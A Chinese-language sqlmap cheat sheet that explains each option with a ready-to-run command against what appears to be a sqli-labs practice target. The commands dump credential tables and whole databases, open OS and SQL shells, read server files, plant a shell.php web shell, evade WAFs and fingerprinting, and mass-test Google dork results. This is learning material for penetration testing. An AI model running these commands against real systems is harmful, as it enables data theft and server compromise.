## 1.简介与使用
- 全自动化的开源 SQL 注入“神器”，用 Python 编写。
- 支持几乎所有的 DBMS（MySQL, Oracle, PostgreSQL, MSSQL 等）。
- 可以自动完成：发现注入点、获取数据库信息、脱库、读写文件、甚至拿操作系统 shell。
```cmd
-u            指定目标URL进行注入检测
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1"

--dbms        指定后端数据库类型，加快检测速度
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --dbms=mysql

--is-dba      检查当前数据库用户是否为DBA权限
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --is-dba

--dbs         枚举所有数据库
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --dbs

--current-db  获取当前使用的数据库名
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --current-db

--current-user 获取当前数据库用户名
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --current-user

-D            指定要操作的数据库，配合--tables使用
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" --tables

--tables       枚举指定数据库中的所有表（需配合-D）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" --tables

-T            指定要操作的表，配合--columns使用
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" --columns

--columns     枚举指定表中的所有字段（需配合-D -T）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" --columns

-C            指定要导出的字段名，配合--dump使用
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" -C "username,password" --dump

--dump        导出指定表/字段的数据
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -D "security" -T "users" -C "username,password" --dump

--dump-all    一键导出所有数据库的全部数据（拖库）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --dump-all

--batch       自动选择默认选项，全程无需人工交互
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --batch --dump

--smart       启发式快速判断，减少无效测试，节约时间
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --smart

--forms       自动解析页面表单并尝试POST注入
sqlmap -u "http://192.168.147.132:83/Less-12/" --forms --dbs

--data        POST注入，后面跟着POST提交的数据
sqlmap -u "http://192.168.147.132:83/Less-12/" --data "passwd=admin&submit=Submit&uname=admin" --dbs

-r            加载本地保存的HTTP请求文件进行注入（将要测试的参数值后加*通配符）
sqlmap -r request.txt --dbs

-l            加载Burp等工具的请求日志文件进行注入
sqlmap -l burp.log --dbs

-g            自动获取Google搜索前100条结果，对有GET参数的URL进行测试
sqlmap -g "inurl:php?id=1" --dbs

-o            一键开启所有默认性能优化（相当于同时使用--keep-alive --null-connection --threads=3）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" -o --dbs

--technique   指定注入技术：U(联合查询) E(报错) B(布尔盲注) T(时间盲注) S(堆叠注入)
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --technique=U --dbs

--level       设置测试等级1-5，等级越高测试范围越广（默认1，>=2 cookie,>=3 UA referer,>=4 host,5会测试所有参数和HTTP头）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --level=3 --dbs

--risk        设置风险等级1-3，等级越高越可能使用可能修改数据的Payload 2 增加基于事件的语句 3增加or语句（不建议，有修改数据的风险）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --risk=2 --dbs

--tamper      调用绕过脚本，多个脚本用逗号分隔（脚本位于/usr/share/sqlmap/tamper/）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --tamper="space2comment,randomcase" --dbs

--delay       每次请求间隔指定秒数，降低频率防止被封
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --delay=2 --dbs

--random-agent 每次请求随机选择User-Agent，隐藏工具指纹
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --random-agent --dbs

--cookie      在请求中携带Cookie，常用于需要登录的页面
sqlmap -u "http://192.168.147.132:83/Less-20/index.php" --cookie="PHPSESSID=abc123" --dbs

--os-shell    获取操作系统交互式Shell（需DBA权限且能写文件）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --os-shell

--os-cmd      在目标服务器上执行单条系统命令
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --os-cmd="whoami"

--sql-shell   获取SQL交互式Shell，可直接执行任意SQL语句
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --sql-shell

--file-read   读取目标服务器上的文件（需DBA权限）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --file-read "C:/flag.txt"

--file-write  将本地文件写入目标服务器（配合--file-dest使用 目标路径）
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --file-write "shell.php" --file-dest "C:/phpstudy/WWW/shell.php"

--flush-session 清除该目标的缓存记录，重新探测
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --flush-session

--proxy       通过代理发送请求，方便Burp抓包分析
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --proxy="http://127.0.0.1:8080"

--check-waf   检测目标是否部署了WAF/IPS
sqlmap -u "http://192.168.147.132:83/Less-1/?id=1" --check-waf

--purge       安全删除sqlmap的所有输出目录
sqlmap --purge
```
